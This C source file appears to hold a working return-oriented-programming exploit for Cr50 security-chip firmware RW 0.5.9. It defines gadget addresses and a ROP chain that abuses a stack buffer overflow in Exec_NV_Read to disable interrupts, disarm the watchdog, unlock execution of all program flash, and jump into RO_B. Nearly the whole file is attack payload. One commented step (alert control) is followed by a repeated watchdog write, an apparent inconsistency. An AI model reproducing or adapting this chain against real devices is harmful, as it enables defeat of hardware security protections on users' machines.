// FOR Cr50 RW 0.5.9
// this code builds the buffer to be loaded into the stack with the out buffer overflow in Exec_NV_Read, which is a ROP chain to jump into RO_B.

#ifndef ROP_0_5_9_GADGETS
#define ROP_0_5_9_GADGETS
#define THUMB_BIT 1

#define GADGET_SET_REG_ADDR (0x807d0 | THUMB_BIT) // usage: (str r4, [r3, #0]), (pop r4, pc)
#define GADGET_DISABLE_INTERRUPTS (0x49eac | THUMB_BIT) // usage: (cpsid I), (mov r3, r6), (pop r4, r5, r6, lr), (bx r3)

// we use the pop instruction with the most amount of reg pops, so we have more control of more regs, if necessary.
#define GADGET_EXTREME_MINIMAL_POP (0x807d2 | THUMB_BIT) // usage: (pop r4, pc)
#define GADGET_MINIMAL_POP (0x6ae66 | THUMB_BIT) // usage: (pop r3, r4, r5, r6, r7, pc)
#define GADGET_POP (0x40a4a | THUMB_BIT) // usage: (pop r3, r4, r5, r6, r7, r8, r9, r10, r11, pc)
#define RO_B_ADDR (0x84424 | THUMB_BIT) // This is the entrypoint of supervisor.B.bin

#define GC_GLOBALSEC_CPU0_I_STAGING_REGION2_BASE_ADDR 0x4009028c
#define GC_GLOBALSEC_CPU0_I_STAGING_REGION2_SIZE 0x40090290
#define GC_GLOBALSEC_CPU0_I_STAGING_REGION2_CTRL 0x40090288
#define GC_GLOBALSEC_ALERT_CONTROL 0x4009405c
#define GC_WATCHDOG_WDOGLOCK 0x40500c00
#define GC_WATCHDOG_WDOGCONTROL 0x40500008
#endif /* ROP_0_5_9_GADGETS */

// yeah, no fancy structs and shit this time.
// its more complicated to manage the main struct than to manually update a rop chain

// on 0.5.7, the RMASmoke vulnerability remains the same, all offsets are the same.
uint32_t rop_chain_0_5_9[] = {
    // initial pop

    // jump to filler pop, because the first 2 regs get run over by Exec_NV_Read.
    // it is convenient that the filler pop's first 2 pop regs are r3 and r4. in the next gadget we use, we dont care about r3 and r4.
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7, r8, r9
    GADGET_POP, // pc

    // disable interrupts
    // r3, r4, r5, r6, r7, r8, r9, r10, r11
    0x0, 0x0, 0x0, GADGET_MINIMAL_POP,  // this is a special case as this sets the pc for the NEXT gadget, as r6 needs to be set before the disable_interrupts pop. r6 is copied into r3, then bx r3 happens after a pop. therefore, our r6 -> pc for interrupts when the disable interrupts gadget is done.
    0x0, 0x0, 0x0, 0x0, 0x0, 
    GADGET_DISABLE_INTERRUPTS, // pc

    // *(uint32_t*)0x4009405c = 0x0
    // literally just make alert control shut up

    // interupt disable pop
    0x0, 0x0, 0x0, 0x0, 0x0, // r4, r5, r6, lr
    // pc after the interupt disable pop

    // minimal pop gadget
    GC_WATCHDOG_WDOGLOCK, 0x1acce551, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc


    // *(uint32_t*)0x40500c00 = 0x1acce551
    // unlock watchdog registers
    GC_WATCHDOG_WDOGLOCK, 0x1acce551, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc

    // *(uint32_t*)0x40500008 = 0x0
    // disarm watchdog interrupt
    GC_WATCHDOG_WDOGCONTROL, 0x0, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc

    // *(uint32_t*)0x40500c00 = 0xdeaddead
    // lock back the watchdog registers
    GC_WATCHDOG_WDOGLOCK, 0xdeaddead, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc

    // UNLOCK EXECUTION TO THE ENTIRE PROGRAM FLASH AREA

    // *(uint32_t*)0x4009028c = 0x40000
    GC_GLOBALSEC_CPU0_I_STAGING_REGION2_BASE_ADDR, 0x40000, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc

    // *(uint32_t*)0x40090290 = 0x7ffff
    GC_GLOBALSEC_CPU0_I_STAGING_REGION2_SIZE, (512 * 1024) - 1, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_MINIMAL_POP, // pc

    // *(uint32_t*)0x40090288 = 0x7
    GC_GLOBALSEC_CPU0_I_STAGING_REGION2_CTRL, 0x7, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, pc
    GADGET_SET_REG_ADDR,
    0x0, // r4
    GADGET_EXTREME_MINIMAL_POP, // pc

    0x0, RO_B_ADDR, // r4, pc
};